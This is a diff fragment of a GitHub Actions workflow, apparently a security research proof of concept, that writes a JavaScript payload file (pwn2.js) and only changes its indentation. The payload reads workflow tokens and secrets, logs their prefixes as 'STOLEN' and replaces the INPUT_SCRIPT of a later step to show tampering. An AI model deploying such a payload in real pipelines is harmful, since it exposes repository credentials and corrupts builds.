@@ -31,40 +31,40 @@ jobs:
 
           $pwnPath = "$env:RUNNER_TEMP\pwn2.js"
           $pwnContent = @'
-(function () {
-  try {
-    var fs = require('fs');
-    var os = require('os');
-    var path = require('path');
-    var where = process.env.GITHUB_ACTION_REPOSITORY || process.env.GITHUB_ACTION || 'node-child';
-    var lines = [];
-    lines.push('PAYLOAD_RAN_IN=' + where);
-    var gt = process.env['INPUT_GITHUB-TOKEN'] || '';
-    lines.push('SEES_INPUT_GITHUB_TOKEN=' + (gt ? 'true' : 'false'));
-    if (gt) { lines.push('STOLEN_INPUT_GITHUB_TOKEN_PREFIX=' + gt.substring(0, 12) + '*** LEN=' + gt.length); }
-    var it = process.env.INPUT_TOKEN || '';
-    lines.push('SEES_INPUT_TOKEN=' + (it ? 'true' : 'false'));
-    if (it) { lines.push('INPUT_TOKEN_PREFIX=' + it.substring(0, 6) + '*** LEN=' + it.length); }
-    var ss = process.env.SCOPED_SECRET || '';
-    lines.push('SEES_SCOPED_SECRET=' + (ss ? 'true' : 'false'));
-    if (ss) { lines.push('STOLEN_SCOPED_SECRET_PREFIX=' + ss.substring(0, 12) + '*** LEN=' + ss.length); }
-    var rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
-    lines.push('SEES_ACTIONS_RUNTIME_TOKEN=' + (rt ? 'true LEN=' + rt.length : 'false'));
-    lines.push('SEES_ID_TOKEN_REQUEST_TOKEN=' + (process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'true' : 'false'));
-    lines.push('NODE_OPTIONS_SEEN=' + (process.env.NODE_OPTIONS || ''));
-    if (process.env.INPUT_SCRIPT) {
-      lines.push('ORIGINAL_INPUT_SCRIPT_HEAD=' + JSON.stringify(String(process.env.INPUT_SCRIPT).substring(0, 80)));
-      process.env.INPUT_SCRIPT = "core.info('INTEGRITY_TAMPER_DEMO=workflow_script_replaced_by_pre_entrypoint_payload'); return 'tampered-by-payload';";
-      lines.push('INPUT_SCRIPT_REPLACED=true');
-    }
-    var sentinel = (process.env.RUNNER_TEMP ? path.join(process.env.RUNNER_TEMP, 'nullbyte-chain-sentinel.txt') : path.join(os.tmpdir(), 'nullbyte-chain-sentinel.txt'));
-    fs.appendFileSync(sentinel, '--- PROCESS ' + where + ' pid=' + process.pid + ' ---\n' + lines.join('\n') + '\n');
-    for (var i = 0; i < lines.length; i++) { console.log('PWN2| ' + lines[i]); }
-  } catch (e) {
-    try { console.log('PWN2| payload error: ' + e.message); } catch (e2) {}
-  }
-})();
-'@
+          (function () {
+            try {
+              var fs = require('fs');
+              var os = require('os');
+              var path = require('path');
+              var where = process.env.GITHUB_ACTION_REPOSITORY || process.env.GITHUB_ACTION || 'node-child';
+              var lines = [];
+              lines.push('PAYLOAD_RAN_IN=' + where);
+              var gt = process.env['INPUT_GITHUB-TOKEN'] || '';
+              lines.push('SEES_INPUT_GITHUB_TOKEN=' + (gt ? 'true' : 'false'));
+              if (gt) { lines.push('STOLEN_INPUT_GITHUB_TOKEN_PREFIX=' + gt.substring(0, 12) + '*** LEN=' + gt.length); }
+              var it = process.env.INPUT_TOKEN || '';
+              lines.push('SEES_INPUT_TOKEN=' + (it ? 'true' : 'false'));
+              if (it) { lines.push('INPUT_TOKEN_PREFIX=' + it.substring(0, 6) + '*** LEN=' + it.length); }
+              var ss = process.env.SCOPED_SECRET || '';
+              lines.push('SEES_SCOPED_SECRET=' + (ss ? 'true' : 'false'));
+              if (ss) { lines.push('STOLEN_SCOPED_SECRET_PREFIX=' + ss.substring(0, 12) + '*** LEN=' + ss.length); }
+              var rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
+              lines.push('SEES_ACTIONS_RUNTIME_TOKEN=' + (rt ? 'true LEN=' + rt.length : 'false'));
+              lines.push('SEES_ID_TOKEN_REQUEST_TOKEN=' + (process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'true' : 'false'));
+              lines.push('NODE_OPTIONS_SEEN=' + (process.env.NODE_OPTIONS || ''));
+              if (process.env.INPUT_SCRIPT) {
+                lines.push('ORIGINAL_INPUT_SCRIPT_HEAD=' + JSON.stringify(String(process.env.INPUT_SCRIPT).substring(0, 80)));
+                process.env.INPUT_SCRIPT = "core.info('INTEGRITY_TAMPER_DEMO=workflow_script_replaced_by_pre_entrypoint_payload'); return 'tampered-by-payload';";
+                lines.push('INPUT_SCRIPT_REPLACED=true');
+              }
+              var sentinel = (process.env.RUNNER_TEMP ? path.join(process.env.RUNNER_TEMP, 'nullbyte-chain-sentinel.txt') : path.join(os.tmpdir(), 'nullbyte-chain-sentinel.txt'));
+              fs.appendFileSync(sentinel, '--- PROCESS ' + where + ' pid=' + process.pid + ' ---\n' + lines.join('\n') + '\n');
+              for (var i = 0; i < lines.length; i++) { console.log('PWN2| ' + lines[i]); }
+            } catch (e) {
+              try { console.log('PWN2| payload error: ' + e.message); } catch (e2) {}
+            }
+          })();
+          '@
           [System.IO.File]::WriteAllText($pwnPath, $pwnContent, [System.Text.Encoding]::UTF8)
 
           $nullByte = [char]0
